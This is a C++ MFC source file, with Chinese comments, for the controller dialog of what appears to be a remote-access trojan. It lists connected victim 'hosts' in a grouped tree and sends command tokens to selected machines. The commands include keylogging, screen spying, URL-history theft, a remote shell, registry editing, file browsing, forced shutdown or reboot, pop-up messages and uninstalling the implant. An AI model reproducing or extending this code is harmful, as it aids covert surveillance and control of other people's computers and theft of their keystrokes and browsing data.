// GroupDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "GroupDlg.h"
#include "MainFrm.h"
#include "InputDlg.h"
#include "InfoDlg.h"
#include "MsgBoxDlg.h"

CGroupDlg	*g_pGroupDlg;
extern CInfoDlg	*g_pInfoDlg;
extern CIOCPServer *m_iocpServer;
// CGroupDlg 对话框

CGroupDlg::CGroupDlg(CWnd* pParent /*=NULL*/)
	: CXTPResizeDialog(CGroupDlg::IDD, pParent) {
	g_pGroupDlg = this;
}

void CGroupDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE_GROUP, m_tree_group);
}


BEGIN_MESSAGE_MAP(CGroupDlg, CXTPResizeDialog)
	ON_WM_PAINT()
	ON_WM_CTLCOLOR()
	ON_WM_WINDOWPOSCHANGED()
	ON_NOTIFY(NM_RCLICK, IDC_TREE_GROUP, &CGroupDlg::OnNMRClickTreeGroup)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE_GROUP, &CGroupDlg::OnTvnSelchangedTreeGroup)
	ON_COMMAND(ID_TOOL_FILE, &CGroupDlg::OnToolFile)
	ON_COMMAND(ID_TOOL_PM, &CGroupDlg::OnToolPm)
	ON_COMMAND(ID_TOOL_SYSTEM, &CGroupDlg::OnToolSystem)
	ON_COMMAND(ID_TOOL_SERVICE, &CGroupDlg::OnToolService)
	ON_COMMAND(ID_TOOL_SYSINFO, &CGroupDlg::OnToolSysinfo)
	ON_COMMAND(ID_TOOL_KEYBOARD, &CGroupDlg::OnToolKeyboard)
	ON_COMMAND(ID_TOOL_REGEDIT, &CGroupDlg::OnToolRegedit)
	ON_COMMAND(ID_TOOL_REMOVE, &CGroupDlg::OnToolRemove)
	ON_COMMAND(ID_TOOL_CHANGEGROUP, &CGroupDlg::OnToolChangegroup)
	ON_COMMAND(ID_TOOL_RESTART, &CGroupDlg::OnToolRestart)
	ON_COMMAND(ID_TOOL_LOGOUT, &CGroupDlg::OnToolLogout)
	ON_COMMAND(ID_TOOL_SHUT, &CGroupDlg::OnToolShut)
	ON_COMMAND(ID_TOOL_SENDMSG, &CGroupDlg::OnToolSendmsg)
	ON_COMMAND(ID_TOOL_CHANGEREMARK, &CGroupDlg::OnToolChangeremark)
	ON_COMMAND(ID_TOOL_REMOTESHELL, &CGroupDlg::OnToolRemoteshell)
END_MESSAGE_MAP()


// CGroupDlg 消息处理程序
BOOL CGroupDlg::OnInitDialog()
{
	CXTPResizeDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetResize(IDC_TREE_GROUP,XTP_ANCHOR_TOPLEFT,    XTP_ANCHOR_BOTTOMRIGHT);

	if(!m_cImageList.Create(16,16,ILC_COLOR32|ILC_MASK,87*2,87*2) )
		return FALSE;

	CBitmap bmp;
	bmp.LoadBitmap(IDB_TREE_IMAGES);
	m_cImageList.Add(&bmp,RGB(255,255,255));
	m_tree_group.SetImageList(&m_cImageList, TVSIL_NORMAL);

	m_hMyComputer= m_tree_group.InsertItem(((CClientApp *)AfxGetApp())->m_CompanyName,0,0);
	m_hAutoComputer= m_tree_group.InsertItem(_T("默认分组(0)"),1,1,m_hMyComputer);

	m_tree_group.EnableMultiSelect();
	m_tree_group.SetItemBold(m_hMyComputer);
//	m_tree_group.SetItemColor(m_hMyComputer,RGB(255,20,147));
	m_tree_group.SetExplorerTheme(TRUE);
//	m_tree_group.SetTheme(xtpControlThemeOffice2016);
	m_tree_group.Expand(m_hMyComputer, TVE_EXPAND);
	m_tree_group.Expand(m_hAutoComputer, TVE_EXPAND);
	m_tree_group.SetFont(&XTPAuxData().font);
	m_tree_group.RefreshMetrics();


	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CGroupDlg::SetOwnerPane(CXTPDockingPane* pPane)
{
	ASSERT(pPane);
	m_pPane = pPane;
}

void CGroupDlg::RefreshMetrics(XTPDockingPanePaintTheme nPaneTheme)
{
	m_brush.DeleteObject();

	XTPControlTheme nTheme = xtpControlThemeDefault;
	COLORREF clrBrush = ::GetSysColor(COLOR_3DFACE);

	switch(nPaneTheme)
	{
	case xtpPaneThemeOffice2007Word:
		clrBrush = XTPResourceImages()->GetImageColor(_T("DockingPane"), _T("WordPaneBackground"));
		nTheme = xtpControlThemeResource;
		break;
	case xtpPaneThemeOffice2013:
		clrBrush = XTPIniColor(_T("DockingPane"), _T("Background"), RGB(255,255,255));
		nTheme = xtpControlThemeOffice2013;
		break;
	case xtpPaneThemeVisualStudio2003: // System nTheme
		clrBrush = ::GetSysColor(COLOR_3DFACE);
		nTheme = xtpControlThemeOfficeXP;
		break;
	case xtpPaneThemeVisualStudio2015:
		clrBrush = XTPIniColor(_T("DockingPane"), _T("Background"), RGB(255,255,255));
		nTheme = xtpControlThemeVisualStudio2015;
		break;
	}

	theApp.m_csPane.RefreshMetrics(nPaneTheme);
	m_brush.CreateSolidBrush(clrBrush);

	SendMessageToDescendants(
		WM_XTP_SETCONTROLTHEME, nTheme);

	RedrawWindow(NULL ,NULL,
		RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);
}

void CGroupDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO: 在此处添加消息处理程序代码
	// 不为绘图消息调用 CXTPResizeDialog::OnPaint()
	CXTPClientRect rWindow(this);
	theApp.m_csPane.DrawBorders(&dc, rWindow, m_pPane);
}

HBRUSH CGroupDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	CXTPResizeDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	return m_brush;
}

void CGroupDlg::OnWindowPosChanged(WINDOWPOS* lpwndpos)
{
	CXTPResizeDialog::OnWindowPosChanged(lpwndpos);

	// TODO: 在此处添加消息处理程序代码
	// refresh borders.
	RedrawWindow(NULL ,NULL,
		RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);
}

// 右键主机
CString strHost;
void CGroupDlg::OnNMRClickTreeGroup(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	CPoint pt;
	CPoint ptSc ;//右击菜单的右上角的位置是基于屏幕坐标系  
	UINT  flag;
	GetCursorPos(&pt); //获取当前点击坐标的全局坐标 
	ptSc =  pt;
	ScreenToClient(&pt);
	MapWindowPoints(&m_tree_group,&pt,1);//MapWindowPoint  为父类（CDialog）的成员函数,  将坐标系映射为CTreeCtrl的坐标系

	HTREEITEM hItem  = m_tree_group.HitTest(pt,&flag) ;
	if(NULL != hItem)
	{
		m_tree_group.Select(hItem,TVGN_CARET);//设置点击节点为当前选中节点
		strHost.Format(_T("%s"),m_tree_group.GetItemText(hItem));
		if (!m_tree_group.ItemHasChildren(hItem)&&strHost.Find(_T("默认分组"))==-1)// 过滤下分组
		{
			CMenu m,*mn;
			m.LoadMenu(IDR_MENU_TOOL);//加载菜单资源
			mn = m.GetSubMenu(0);//获取菜单子项
			mn->TrackPopupMenu(TPM_LEFTALIGN,ptSc.x,ptSc.y,this); //显示菜单
		}
	}

	*pResult = 0;
}


// 点击主机
void CGroupDlg::OnTvnSelchangedTreeGroup(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	if(pNMTreeView->itemNew.hItem!=pNMTreeView->itemOld.hItem)
	{
		// 主机名
		CString strText = m_tree_group.GetItemText(pNMTreeView->itemNew.hItem);
		if (!m_tree_group.ItemHasChildren(pNMTreeView->itemNew.hItem)&&strText.Find(_T("默认分组"))==-1)// 过滤下分组
		{
			if ( m_tree_group.GetSelectedCount() == 0 )//修复release模式下单击分组弹出encountered an improper argument
				return;

			CString strmem,strcpu,stros,strip,struser;
			for(int i=0;i<g_pInfoDlg->m_list_info.GetItemCount();i++)
			{
				if (m_tree_group.GetItemData(pNMTreeView->itemNew.hItem) == g_pInfoDlg->m_list_info.GetItemData(i))
				{
					strmem  = g_pInfoDlg->m_list_info.GetItemText(i,4);
					struser = g_pInfoDlg->m_list_info.GetItemText(i,3);
					strcpu  = g_pInfoDlg->m_list_info.GetItemText(i,5);
					strip   = g_pInfoDlg->m_list_info.GetItemText(i,1);
					stros   = g_pInfoDlg->m_list_info.GetItemText(i,7);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_OS2,stros);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_USER2,struser);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_CPU2,strcpu);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_IP2,strip);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_MEM2,strmem);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_HOST,strText);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_NAME2,strText);
				}
			}
		}
	}
	*pResult = 0;
}


void CGroupDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{     
	if ( m_tree_group.GetSelectedCount() == 0 )
		return;

	HTREEITEM hGroupItem = m_tree_group.GetRootItem();
	hGroupItem = m_tree_group.GetChildItem(hGroupItem);
	HTREEITEM hChildItem = NULL;
	while(hGroupItem)//进入分组查找
	{
		if (m_tree_group.ItemHasChildren(hGroupItem))//针对存在主机的分组进行查找
		{
			hChildItem = m_tree_group.GetChildItem(hGroupItem);
			while(hChildItem)//进入主机查找
			{
				if (m_tree_group.GetItemState(hChildItem, TVIS_SELECTED)&&!m_tree_group.ItemHasChildren(hChildItem))//针对选中状态
				{
					ClientContext* pContext = (ClientContext*)m_tree_group.GetItemData(hChildItem);
					m_iocpServer->Send(pContext, pData, nSize);//向该主机发送命令
				}
				hChildItem = m_tree_group.GetNextSiblingItem(hChildItem);//遍历下一主机
			}

			hGroupItem = m_tree_group.GetNextSiblingItem(hGroupItem);//遍历下一分组
		}
		else//分组内不存在主机
		{
			hGroupItem =m_tree_group.GetNextSiblingItem(hGroupItem);//遍历下一分组
		}		
	}	

}

void CGroupDlg::OnToolFile()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolPm()
{
	// TODO: 在此添加命令处理程序代码
 	BYTE	bToken = COMMAND_SCREEN_SPY;
  SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolSystem()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolService()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SERVICE_MANAGER;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolSysinfo()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_URL_HISTORY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolKeyboard()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolRegedit()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolRemove()
{
	// TODO: 在此添加命令处理程序代码
	if (MessageBox(_T("确认卸载服务端吗?)"), _T("警告"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken = COMMAND_UNINSTALL;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}



HTREEITEM  CGroupDlg::AddToGroup(CString strGroup)//向树形结点添加分组，并返回句柄。入参为添加的分组名（不能带括号）
{
	HTREEITEM hRootItem = m_tree_group.GetRootItem();
	HTREEITEM hItem = m_tree_group.GetChildItem(hRootItem);

	if(hItem == NULL)//还没有任何主机上线
	{
		hItem = m_tree_group.InsertItem(strGroup,hRootItem);//写入分组
		m_tree_group.SetItemData(hItem, 0x1);               //分组的主机标记位，刚好可以记录组内主机数量，初始化为1
		m_tree_group.SetItemImage(hItem,1,1);               //设置图标
		m_nCount++;                                         //分组数量加1

	}else 
	{
		while(hItem != NULL) 
		{
			CString strTitle = m_tree_group.GetItemText(hItem);//从树形控件读取分组名
			int i = strTitle.Find("(");
			strTitle = strTitle.Left(i);
			if(strTitle == strGroup)
			{				
				m_tree_group.SetItemData(hItem,m_tree_group.GetItemData(hItem)+1);//组内主机数量加1				
				break;
			}
			hItem = m_tree_group.GetNextItem(hItem,TVGN_NEXT); //遍历同等级子结点
		}
		if(hItem == NULL)                                      //遍历分组结束，并且未找到
		{
			hItem = m_tree_group.InsertItem(strGroup,hRootItem);//写入新分组
			m_tree_group.SetItemData(hItem, 0x1);               //分组的主机标记位，刚好可以记录组内主机数量，初始化为1
			m_tree_group.SetItemImage(hItem,1,1);               //设置图标
			m_nCount++;                                         //分组数量加1		
		}
	}
	//重置分组名
	strGroup.Format(_T("%s(%d)"), strGroup , m_tree_group.GetItemData(hItem));
	m_tree_group.SetItemText(hItem, strGroup);

	//展开分组
	m_tree_group.Expand(hItem,TVE_EXPAND); 

	return hItem;
}

//更改分组
void CGroupDlg::OnToolChangegroup()
{
	// TODO: 在此添加命令处理程序代码
	if ( m_tree_group.GetSelectedCount() == 0 )//没有选中主机直接返回
		return;

	HTREEITEM hItem = m_tree_group.GetSelectedItem();

	CString str,strGroup;
	CInputDialog dlg;

	if (m_tree_group.GetSelectedCount() == 1)//选中一个主机
	{		
		str.Format(_T("更改(%s)的分组"), m_tree_group.GetItemText(hItem));
		strGroup = m_tree_group.GetItemText(m_tree_group.GetParentItem(hItem));
		int i = strGroup.Find(_T("("));
		strGroup = strGroup.Left(i);
		dlg.m_str.Format(_T("%s"), strGroup);//取主机分组值，方便修改
	}
	else{
		MessageBox(_T("暂不支持多个主机同时操作！"),_T("提示"), MB_ICONWARNING);
		return;
	}

	dlg.Init(str, _T("请输入新的分组:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	strGroup  = dlg.m_str; //新的分组名

	HTREEITEM hParent = g_pGroupDlg->m_tree_group.GetParentItem(hItem);
	CString strTitle = m_tree_group.GetItemText(hParent);//从树形控件读取分组名
	int i = strTitle.Find(_T("("));
	strTitle = strTitle.Left(i);

	if (strcmp(strTitle,strGroup) ==0)
	{
		MessageBox(_T("已经在该分组，不需要修改！"),_T("提示"), MB_ICONWARNING);
		return;
	}

	int		nPacketLength =  strGroup.GetLength()  + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_CHANGE_GROUP;
	memcpy(lpPacket + 1, strGroup, nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength); //发送命令
	delete[] lpPacket;

	//写入新的分组，并返回组句柄
	HTREEITEM  hGroup = AddToGroup(dlg.m_str);

	//在新分组写入计算机名,并返回新结点的句柄
	HTREEITEM  hChild = m_tree_group.InsertItem(m_tree_group.GetItemText(hItem),2,2,hGroup);

	//在新结点内写入命令标记
	m_tree_group.SetItemData(hChild, m_tree_group.GetItemData(hItem));  

	//删除原主机及分组
	m_tree_group.DeleteItem(hItem); //删除主机
	m_tree_group.SetItemData(hParent, m_tree_group.GetItemData(hParent)-1);//改写分组内主机数量

	if(m_tree_group.GetItemData(hParent) == 0&& strTitle.Find(_T("默认分组"))==-1)//若分组内无主机则删除
	{
		m_tree_group.DeleteItem(hParent);  //删除分组
		m_nCount -= 1;                     //分组数量减1
	}
	else
	{
		//重置分组显示
		strTitle.Format(_T("%s(%d)"),strTitle ,m_tree_group.GetItemData(hParent));  //将主机数量加在数组名后
		m_tree_group.SetItemText( hParent, strTitle);//重置分组信息
	}
}

//更改备注
void CGroupDlg::OnToolChangeremark()
{
	// TODO: 在此添加命令处理程序代码
	HTREEITEM hItem = m_tree_group.GetSelectedItem();

	CString str;
	CInputDialog dlg;

	if (m_tree_group.GetSelectedCount() == 1)//选中一个主机
	{		
		str.Format(_T("更改(%s)的备注"), m_tree_group.GetItemText(hItem));
	}
	else{
		MessageBox(_T("暂不支持多个主机同时操作！"),_T("提示"), MB_ICONWARNING);
		return;
	}

	dlg.Init(str, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	int		nPacketLength =  dlg.m_str.GetLength()  + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str, nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength); //发送命令
	delete[] lpPacket;

	m_tree_group.SetItemText(hItem,dlg.m_str);

}



void CGroupDlg::OnToolRestart()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//	LocalFree((LPBYTE)&bToken);
}

void CGroupDlg::OnToolLogout()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//	LocalFree((LPBYTE)&bToken);
}

void CGroupDlg::OnToolShut()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//	LocalFree((LPBYTE)&bToken);
}

struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;

void CGroupDlg::OnToolSendmsg()
{
	// TODO: 在此添加命令处理程序代码
	CMsgBoxDlg dlg;
SHOW:
	if(dlg.DoModal() != IDOK) 
		return;

	if (strlen(dlg.m_edit_caption)<1 || strlen(dlg.m_edit_text) < 1)
	{
		MessageBox("请输入发送标题及内容... ", "提示! ", MB_OK | MB_ICONWARNING);
		goto SHOW;
	}

	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_edit_caption.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_edit_text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;

	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_MESSAGEBOX;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));

	SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto SHOW;
}




void CGroupDlg::OnToolRemoteshell()
{
	// TODO:  在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
